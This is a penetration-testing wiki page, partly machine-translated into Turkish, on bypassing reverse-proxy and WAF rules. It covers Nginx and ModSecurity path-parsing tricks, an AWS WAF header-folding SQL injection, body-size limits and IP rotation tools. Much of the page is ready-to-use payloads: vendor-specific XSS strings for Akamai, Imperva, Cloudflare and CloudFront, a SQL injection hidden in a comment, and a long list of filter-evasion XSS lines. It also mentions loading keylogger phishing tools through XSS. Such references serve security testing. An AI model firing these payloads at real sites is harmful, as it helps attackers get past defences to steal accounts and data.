# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Teknikler [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx kural örneği:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
In order to prevent bypasses Nginx performs path normalization before checking it. However, if the backend server performs a different normalization (removing characters that nginx doesn't remove) it might be possible to bypass this defense.

### **NodeJS - Express**

| Nginx Sürümü | **Node.js Baypas Karakterleri** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Sürümü | **Flask Baypas Karakterleri**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Sürümü | **Spring Boot Baypas Karakterleri** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM yapılandırması:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx, `/admin.php` erişimini engelleyecek şekilde yapılandırılmıştır ancak `/admin.php/index.php` adresine erişilerek bu engel aşılabilir.

### Nasıl önlenir
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) açıklıyor ki ModSecurity v3 (3.0.12'ye kadar), **`REQUEST_FILENAME`** değişkenini yanlış implemente etmişti; bu değişken erişilen yolu (parametrelerin başlangıcına kadar) içermeliydi. Bunun sebebi yolu almak için URL decode işlemi yapmasıdır.\
Bu nedenle, `http://example.com/foo%3f';alert(1);foo=` gibi bir istek mod security içinde yolun sadece `/foo` olduğunu varsayacaktır çünkü `%3f` `?`'ye dönüştürülür ve URL yolunu sonlandırır; fakat aslında sunucunun alacağı yol `/foo%3f';alert(1);foo=` olacaktır.

`REQUEST_BASENAME` ve `PATH_INFO` değişkenleri de bu hatadan etkilendi.

Benzer bir durum ModSecurity'nin 2 sürümünde de meydana gelmiş; bu, yedekleme dosyalarıyla ilişkili belirli uzantılara (ör. `.bak`) erişimi engelleyen bir korumayı, noktayı `%2e` olarak URL encode ederek atlatmaya izin veriyordu. Örneğin: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) belirtiliyor ki, AWS tarafından düzgün parse edilmeyen fakat backend sunucu tarafından parse edilen "malformed" bir header gönderilerek HTTP headers üzerinde uygulanan AWS WAF kuralları atlanabiliyordu.

For example, sending the following request with a SQL injection in the header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
It was possible to bypass AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed).

## Genel WAF bypasses

### İstek Boyutu Limitleri

Genellikle WAF'ların kontrol etmek için belirli bir istek uzunluğu limiti vardır; eğer bir POST/PUT/PATCH isteği bu limiti aşarsa, WAF isteği kontrol etmez.

- AWS WAF için [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Application Load Balancer ve AWS AppSync korumaları için denetlenebilecek bir web istek gövdesinin maksimum boyutu</td><td>8 KB</td></tr><tr><td>CloudFront, API Gateway, Amazon Cognito, App Runner ve Verified Access korumaları için denetlenebilecek bir web istek gövdesinin maksimum boyutu**</td><td>64 KB</td></tr></tbody></table>

- Kaynak [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Older Web Application Firewalls with Core Rule Set 3.1 (or lower) allow messages larger than **128 KB** by turning off request body inspection, but these messages won't be checked for vulnerabilities. For newer versions (Core Rule Set 3.2 or newer), the same can be done by disabling the maximum request body limit. When a request exceeds the size limit:

Eğer **prevention mode** ise: İsteği loglar ve engeller.\
Eğer **detection mode** ise: Limite kadar denetler, kalan kısmı görmezden gelir ve `Content-Length` limitin üzerinde ise log tutar.

- Kaynak [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

By default, the WAF inspects only the first 8KB of a request. It can increase the limit up to 128KB by adding Advanced Metadata.

- Kaynak [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Up to 128KB.

### Statik varlık denetim boşlukları (.js GETs)

Bazı CDN/WAF yığınları, statik varlıklar için yapılan GET isteklerine (ör. yolları `.js` ile biten) zayıf veya hiç içerik denetimi uygulamaz; buna karşın rate limiting ve IP reputation gibi global kuralları uygular. Statik uzantıların otomatik önbelleklemesiyle birleştiğinde, bu durum sonraki HTML yanıtlarını etkileyen kötü amaçlı varyantların teslimi veya yerleştirilmesi için kötüye kullanılabilir.

Uygulamalı kullanım örnekleri:

- İçerik denetiminden kaçınmak için bir `.js` yoluna yapılan GET sırasında untrusted headers (ör. `User-Agent`) içine payload gönderin, sonra önbelleğe alınmış varyantı etkilemek için hemen ana HTML'i isteyin.
- Temiz/yeni bir IP kullanın; IP bir kez işaretlendiğinde, yönlendirme değişiklikleri tekniği güvenilmez kılabilir.
- Burp Repeater'da "Send group in parallel" (single-packet style) seçeneğini kullanarak iki isteği (`.js` sonra HTML) aynı front-end yolundan yarıştırın.

This pairs well with header-reflection cache poisoning. See:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuscation <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode Uyumluluğu <a href="#unicode-compatability" id="unicode-compatability"></a>

Unicode normalizasyonunun uygulanma biçimine bağlı olarak (daha fazla bilgi [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), Unicode uyumluluğu paylaşan karakterler WAF'ı atlatıp amaçlanan payload olarak çalıştırılabiliyor olabilir. Uyumlu karakterler şurada bulunabilir: [here](https://www.compart.com/en/unicode).

#### Örnek <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Kodlamalarla bağlamsal WAF'leri atlatma <a href="#ip-rotation" id="ip-rotation"></a>

As mentioned in [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), Kullanıcı girdisinin bağlamını koruyabilen WAF'leri atlatmak için WAF tekniklerini kullanıcı girdisini gerçekten normalize edecek şekilde kötüye kullanabiliriz.

For example, in the post it's mentioned that **Akamai URL decoded a user input 10 times**. Therefore something like `<input/%2525252525252525253e/onfocus` will be seen by Akamai as `<input/>/onfocus` which **might think that it's ok as the tag is closed**. Ancak uygulama girdiyi 10 kez URL decode etmediği sürece, hedef `<input/%25252525252525253e/onfocus` gibi bir şey görecektir ve bu **hala XSS saldırısı için geçerlidir**.

Bu yüzden bu, WAF'in decode edip yorumlayacağı fakat hedefin görmeyeceği şekilde kodlanmış bileşenlere payload'ları **gizlemeye** olanak tanır.

Ayrıca bu sadece URL encoded payload'larla değil, unicode, hex, octal gibi diğer kodlamalarla da yapılabilir...

Yazıda aşağıdaki son bypass'lar öneriliyor:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Ayrıca bazı WAF'lerin kullanıcı girdisinin bağlamını **nasıl anladığına** bağlı olarak bunun kötüye kullanılmasının mümkün olabileceği belirtiliyor. Yazıda verilen örnek, Akamai'nin `/*` ve `*/` arasına her şeyi koymaya izin verdiğiydi (muhtemelen bunun yaygın olarak yorum satırı olarak kullanılması nedeniyle). Bu nedenle `/*'or sleep(5)-- -*/` gibi bir SQLinjection yakalanmayacak ve geçerli olacaktır çünkü `/*` enjeksiyonun başlangıç dizisi sayılacak ve `*/` yorum satırı olarak değerlendirilecektir.

Bu tür bağlam sorunları, WAF tarafından hedeflenen zafiyetten farklı diğer zafiyetleri de **kötüye kullanmak** için kullanılabilir (ör. bu aynı zamanda bir XSS'i exploit etmek için de kullanılabilir).

### Inline JavaScript first-statement inspection gaps

Some inline-inspection rulesets only parse the first JavaScript statement present inside an event handler. Parantez içinde zararsız görünen bir ifadeyi noktalı virgülle önekleyerek (örneğin `onfocus="(history.length);payload"`), noktalı virgülden sonra yerleştirilen kötü amaçlı kod incelemeyi atlatır ancak tarayıcı yine de çalıştırır. Bunu fragment-tetikli odak ile (ör. hedeflenen öğe yüklenince odaklanması için `#forgot_btn` eklemek) birleştirmek, hemen `$.getScript` çağırıp keylogger gibi phishing araçlarını bootstrap edebilen click-less XSS'e olanak verir. Bakınız [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs) ve bu çalışmadan türetilen [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ffuf ile kullanılmak üzere bir API gateway URL'si üretir
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): fireprox ile benzer
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): API gateway IP'lerini kullanan bir Burp Suite eklentisi
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Girdi dosyası boyutu ve split faktörüne bağlı olarak dinamik olarak belirlenen sayıda container örneği etkinleştirilir; girdi, paralel yürütme için parçalara bölünür. Örneğin 10.000 satırlık bir girdi dosyası ve 100 satırlık split faktörü ile 100 örnek, 100 parçayı işler.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Farklı teknikler, firewall'lardaki regex filtrelerini atlatmak için kullanılabilir. Örnekler arasında büyük/küçük harf değiş tokuşu, satır sonu ekleme ve payload'ların kodlanması bulunur. Çeşitli bypass'lar için kaynaklar [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) ve [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) sayfalarında bulunabilir. Aşağıdaki örnekler [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) adresinden alınmıştır.
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Araçlar

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp eklentisi; isteklere uzunluk ekleyerek WAFs'ı atlatmak için gereksiz (junk) veri ekler

## Referanslar

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
